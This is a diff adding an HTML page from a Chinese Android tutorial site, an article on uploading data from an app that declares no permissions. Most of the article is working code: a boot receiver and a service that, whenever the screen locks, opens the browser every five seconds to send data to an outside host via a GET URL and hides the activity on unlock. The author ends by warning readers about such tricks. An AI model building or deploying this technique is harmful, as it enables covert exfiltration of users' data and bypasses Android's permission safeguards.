@@ -1,0 +1,58 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML xmlns="http://www.w3.org/1999/xhtml">
+<HEAD>
+<TITLE>Android 安全之谁动了我的流量(0权限上传数据)_Android学习手册</TITLE>
+<META content="text/html; charset=gb2312" http-equiv=Content-Type><LINK  rel=stylesheet type=text/css href="../css/c5.css">
+<META name=GENERATOR content="MSHTML 8.00.6001.18702">
+<meta name="Description" content=Android基础 Android组件 Android用户界面 Android设备功能 Android数据存储 Android网络应用 Android游戏开发 Android多媒体 Android源码开发 Android高级进阶 Android面试题/>
+<meta name="Keywords" content="android 学习手册">
+
+</HEAD>
+<BODY id=homesecond class=serverscripting>
+<DIV id=wrapper>
+<DIV id=header><h1><a href="../index.html">Android学习手册</a></h1> 
+</DIV>
+
+<DIV id=navfirst>
+<div id="indexGuide"><UL><li ><A href="../basic/index.html">Android基础</A> </li><li ><A href="../component/index.html">Android组件</A> </li><li ><A href="../userinterface/index.html">用户界面</A> </li><li ><A href="../device/index.html">设备功能</A> </li><li ><A href="../datastorage/index.html">数据存储</A> </li><li ><A href="../network/index.html">网络应用</A> </li><li ><A href="../game/index.html">游戏开发</A> </li><li ><A href="../multimedia/index.html">多媒体</A> </li><li ><A href="../source/index.html">源码开发</A> </li><li class="navcurrentLink"><A href="index.html">高级进阶</A> </li><li ><A href="../interview/index.html">Android面试题</A> </li></UL></div>
+</DIV>
+<DIV id=navsecond>
+<DIV id=course>
+<div id="kcTitle">课 程 表</div>
+
+
+  <h2><A title="Android基础之运行原理和机制" href="index_215.html">Android基础之运行原理和机制</A></h2>
+
+  <h2><A title="Android高级篇之Android优化" href="index_216.html">Android高级篇之Android优化</A></h2>
+
+  <h2><A title="Android高级篇之编译及反编译" href="index_217.html">Android高级篇之编译及反编译</A></h2>
+
+  <h2><A title="Android高级篇之加密解密" href="index_218.html">Android高级篇之加密解密</A></h2>
+
+  <h2><A title="Android高级篇之Android 安全" href="index_219.html">Android高级篇之Android 安全</A></h2>
+<UL><li ><A title=Android手机获得ROOT权限后的安全隐患 href="show_401_219.html">Android手机获得ROOT权限后的安全隐患</A> </li><li class="currentLink"><A title=Android 安全之谁动了我的流量(0权限上传数据) href="show_402_219.html">Android 安全之谁动了我的流量(0权限上传数据)</A> </li><li ><A title=Android 安全与权限介绍 href="show_403_219.html">Android 安全与权限介绍</A> </li><li ><A title=Android手机的三大安全误区 href="show_404_219.html">Android手机的三大安全误区</A> </li><li ><A title=关于Android里面安全与权限里面的SharedUserId？ href="show_405_219.html">关于Android里面安全与权限里面的SharedUserId？</A> </li></UL>
+  <h2><A title="Android高级篇之算法" href="index_220.html">Android高级篇之算法</A></h2>
+
+  <h2><A title="Android高级篇之解锁教程" href="index_221.html">Android高级篇之解锁教程</A></h2>
+
+</DIV></DIV>
+<DIV id=maincontent>
+<DIV id=w3school>
+<H1></H1>
+<P><STRONG></STRONG></P></DIV>
+
+<DIV>
+<H2>Android 安全之谁动了我的流量(0权限上传数据)</H2>
+<div style="line-height:20px; font-size:14px;"><p>上次写过一篇文章  抛砖引玉 之 谁动了我的隐私(android用户隐私窥探)  描述如何读取系统log缓冲区但还存在权限提示问题。</p><p>这次来个稍微好点的，真正的0权限上传数据。</p><p>同上次讲的一样，虽然大部分用户在安装app时对权限警告视而不见，但相信以后用户会对权限问题越来越重视的。</p><p>这次咱们先真正的来一次0权限上传热热身。</p><p style="color:#3333FF;">一、原理</p><p>首先利用的还是那个开机启动bug。</p><p>然后，在手机锁屏时上传数据。</p><p>如何上传数据呢，为了避免权限咱们得瞒天过海。</p><p>我们知道，在Intent转向的时候，可以转到标记为ACTION_VIEW的activity，而浏览器都有这个标记，可以传一个uri过去。</p><p>soga,说到这里，，明白了吧。就是使用http的GET传参，虽然只能传明文，但已经够了，更何况一次能传输的字节也还是很客观的。</p><p>至于传什么，每个想实现这种功能的人都有其目的吧。</p><p style="color:#3333FF;">二、实现</p><p>首先是清单文件，不需要声明任何权限，只需要写一个广播接收者和一个服务即可。</p><p><pre>&lt;?xml version=<font class="Fields">"1.0"</font> encoding=</font><font class="Fields">"utf-8"</font>?&gt;</p><p>&lt;manifest xmlns:android=<font class="Fields">"http:<font class="Comments">//schemas.android.com/apk/res/android</font></p><p>    </font>package=<font class="Fields">"org.igeek.hack</p><p>    </font>android:versionCode=<font class="Fields">"1</p><p>    </font>android:versionName=<font class="Fields">"1.0"</font> &gt;</p><p>    </font>&lt;uses-sdk android:minSdkVersion=<font class="Fields">"8"</font> /&gt;</p><p>    &lt;application</p><p>        </font>android:icon=<font class="Fields">"@drawable/icon</p><p>        </font>android:label=<font class="Fields">"@string/app_name"</font> &gt;</p><p>        </font>&lt;receiver android:name=<font class="Fields">".reciver.HackReceiver"</font> &gt;</p><p>            </font>&lt;intent-filter android:priority=<font class="Fields">"1000"</font> &gt;</p><p>                </font>&lt;action android:name=<font class="Fields">"android.intent.action.BOOT_COMPLETED"</font> /&gt;</p><p>            &lt;/intent-filter&gt;</p><p>        &lt;/receiver&gt;</p><p>        </font>&lt;service android:name=<font class="Fields">".service.HackerService"</font> /&gt;</p><p>    &lt;/application&gt;</p><p>&lt;/manifest&gt;</p><p></pre></p><p>然后就是广播接收者的实现，很简单，单纯的开启一个服务。</p><p><pre><font class="keyword">import </font>org.igeek.hack.service.HackerService;</p><p><font class="keyword">import </font>android.content.BroadcastReceiver;</p><p><font class="keyword">import </font>android.content.Context;</p><p><font class="keyword">import </font>android.content.Intent;</p><p><font class="keyword">public </font><font class="keyword">class </font>HackReceiver </font><font class="keyword">extends </font>BroadcastReceiver {</p><p>	@Override</p><p>	<font class="keyword">public </font><font class="keyword">void </font>onReceive(Context context, Intent intent) {</p><p>		</font>Intent it = <font class="keyword">new </font>Intent(context, HackerService.</font><font class="keyword">class</font>);</p><p>		context.startService(it);</p><p>	}</p><p>}</p><p></pre></p><p>最后，就是关键部分，服务的实现。</p><p><pre><font class="keyword">import </font>java.util.Random;</p><p><font class="keyword">import </font>android.app.KeyguardManager;</p><p><font class="keyword">import </font>android.app.Service;</p><p><font class="keyword">import </font>android.content.BroadcastReceiver;</p><p><font class="keyword">import </font>android.content.Context;</p><p><font class="keyword">import </font>android.content.Intent;</p><p><font class="keyword">import </font>android.content.IntentFilter;</p><p><font class="keyword">import </font>android.net.Uri;</p><p><font class="keyword">import </font>android.os.Handler;</p><p><font class="keyword">import </font>android.os.IBinder;</p><p><font class="keyword">import </font>android.util.Log;</p><p><font class="keyword">public </font><font class="keyword">class </font>HackerService </font><font class="keyword">extends </font>Service {</p><p>	<font class="keyword">private </font>ScreenOnBroadcastReciver soReciver;</p><p>	<font class="keyword">private </font>ScreenOFFBroadcastReciver sfReciver;</p><p>	<font class="keyword">private </font>Handler handler;</p><p>	<font class="keyword">final </font><font class="keyword">static </font>String LOG_TAG = <font class="Fields">"hack"</font>;</p><p>	KeyguardManager keyguardManager;</p><p>	Intent it;</p><p>	<font class="Comments">// GET提交地址</font></p><p>	<font class="keyword">final </font>String HACK_URL = <font class="Fields">"http:<font class="Comments">//www.igeek.org/hack?info="</font>;</font></p><p>	<font class="keyword">private </font>Runnable r = </font><font class="keyword">new </font>Runnable() {</p><p>		@Override</p><p>		<font class="keyword">public </font><font class="keyword">void </font>run() {</p><p>			<font class="Comments">// 如果是锁屏状态</font></p><p>			<font class="keyword">if </font>(keyguardManager.inKeyguardRestrictedInputMode()) {</p><p>				<font class="Comments">// GET上传，内容随你</font></p><p>				</font>String hackInfo = <font class="Fields">"hack!!!!your information!!!!!!!&r=</p><p>						</font>+ <font class="keyword">new </font>Random().nextFloat();</p><p>				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</p><p>				Uri uri = Uri.parse(HACK_URL + hackInfo);</p><p>				it.setData(uri);</p><p>				startActivity(it);</p><p>				</font>Log.i(LOG_TAG, <font class="Fields">"提交数据-&gt;"</font> + HACK_URL + hackInfo);</p><p>				<font class="Comments">// 每隔5秒，执行一次上传</font></p><p>				handler.postDelayed(r, 5000);</p><p>			}</p><p>		}</p><p>	};</p><p>	@Override</p><p>	<font class="keyword">public </font><font class="keyword">void </font>onStart(Intent intent, </font><font class="keyword">int </font>startId) {</p><p>		<font class="keyword">super</font>.onStart(intent, startId);</p><p>		keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);</p><p>		</font>it = <font class="keyword">new </font>Intent(Intent.ACTION_VIEW);</p><p>		</font>handler = <font class="keyword">new </font>Handler();</p><p>		</font>Log.i(LOG_TAG, <font class="Fields">"开机完成，注册广播接收者"</font>);</p><p>		</font>soReciver = <font class="keyword">new </font>ScreenOnBroadcastReciver();</p><p>		</font>sfReciver = <font class="keyword">new </font>ScreenOFFBroadcastReciver();</p><p>		</font>IntentFilter onIntentFilter = <font class="keyword">new </font>IntentFilter(</p><p>				<font class="Fields">"android.intent.action.SCREEN_ON"</font>);</p><p>		registerReceiver(soReciver, onIntentFilter);</p><p>		</font>IntentFilter offIntentFilter = <font class="keyword">new </font>IntentFilter(</p><p>				<font class="Fields">"android.intent.action.SCREEN_OFF"</font>);</p><p>		registerReceiver(sfReciver, offIntentFilter);</p><p>	}</p><p>	@Override</p><p>	<font class="keyword">public </font>IBinder onBind(Intent intent) {</p><p>		<font class="keyword">return </font><font class="keyword">null</font>;</p><p>	}</p><p>	<font class="Comments">/**</font></p><p>	 <font class="Comments">* 解锁广播接收者</font></p><p>	 <font class="Comments">*/</font></p><p>	<font class="keyword">class </font>ScreenOnBroadcastReciver </font><font class="keyword">extends </font>BroadcastReceiver {</p><p>		@Override</p><p>		<font class="keyword">public </font><font class="keyword">void </font>onReceive(Context context, Intent intent) {</p><p>			</font>Log.i(LOG_TAG, <font class="Fields">"屏幕解开"</font>);</p><p>			handler.removeCallbacks(r);</p><p>			intent.setAction(Intent.ACTION_MAIN);</p><p>			intent.addCategory(Intent.CATEGORY_HOME);</p><p>			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</p><p>			</font>Log.i(LOG_TAG, <font class="Fields">"转向HOME"</font>);</p><p>			startActivity(intent);</p><p>		}</p><p>	}</p><p>	<font class="Comments">/**</font></p><p>	 <font class="Comments">* 锁屏广播接收者</font></p><p>	 <font class="Comments">*/</font></p><p>	<font class="keyword">class </font>ScreenOFFBroadcastReciver </font><font class="keyword">extends </font>BroadcastReceiver {</p><p>		@Override</p><p>		<font class="keyword">public </font><font class="keyword">void </font>onReceive(</font><font class="keyword">final </font>Context context, Intent intent) {</p><p>			</font>Log.i(LOG_TAG, <font class="Fields">"屏幕锁住"</font>);</p><p>			<font class="Comments">// 500ms后开始执行上传数据</font></p><p>			handler.postDelayed(r, 500);</p><p>		}</p><p>	}</p><p>}</p><p></pre></p><p style="color:#3333FF;">三、效果</p><p>哈，运行下试试，关机。。。开机。。。锁屏。。解锁。。没发现什么反应啊。。。再看看程序管理。。Hack程序也没有任何权限提示啊。</p><p><img src="../img/adv_security/02_Hack01.jpg"></p><p>真的这样吗？来看看log。</p><p><img src="../img/adv_security/02_log01.jpg"></p><p>you see? 流量就这么悄悄的耗了。</p><p>本工程包地址：hack_0p_upload.zip</p><p style="color:#3333FF;">结束语</p><p>这么流氓的伎俩，相信谁都不想碰到，google market也混乱的一塌糊涂，android app混乱的不成样子，大家还是擦亮双眼，安全，一定要注意的。</p><p></p></div>
+
+</DIV></DIV>
+
+<DIV id=footer style="display:none">
+<P align="center">  
+ 
+ 
+ 
+    </P>
+</DIV></BODY></HTML>
+
